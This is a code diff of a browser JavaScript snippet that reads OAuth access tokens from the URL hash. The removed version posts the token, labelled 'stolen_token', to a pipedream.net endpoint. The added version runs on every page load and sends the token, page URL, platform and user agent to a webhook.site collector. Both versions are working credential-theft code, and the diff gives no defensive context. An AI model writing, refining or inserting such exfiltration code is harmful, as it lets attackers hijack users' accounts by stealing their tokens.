@@ -1,12 +1,36 @@
-const token = window.location.hash.substring(1).split("&").find(p => p.startsWith("access_token="));
-if (token) {
-    fetch("https://eolk1qu152xm90d.m.pipedream.net", {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify({
-            stolen_token: token.split("=")[1],
-            full_url: window.location.href,
-            timestamp: new Date().toISOString()
-        })
-    });
+// Function to send data to your webhook
+async function sendDataToWebhook(data) {
+    const webhookURL = 'https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190';
+    
+    try {
+        await fetch(webhookURL, {
+            method: 'POST',
+            mode: 'no-cors', // Used for cross-origin requests to webhooks
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                timestamp: new Date().toISOString(),
+                location: window.location.href,
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                collectedData: data
+            })
+        });
+    } catch (error) {
+        console.error('Error sending data:', error);
+    }
 }
+
+// Example: Sending data when a specific event occurs
+window.onload = () => {
+    // Check for tokens in the URL hash (common in OAuth flows)
+    const urlParams = new URLSearchParams(window.location.hash.substring(1));
+    const token = urlParams.get('access_token');
+    
+    if (token) {
+        sendDataToWebhook({ token: token });
+    } else {
+        sendDataToWebhook({ info: "No token found in URL" });
+    }
+};
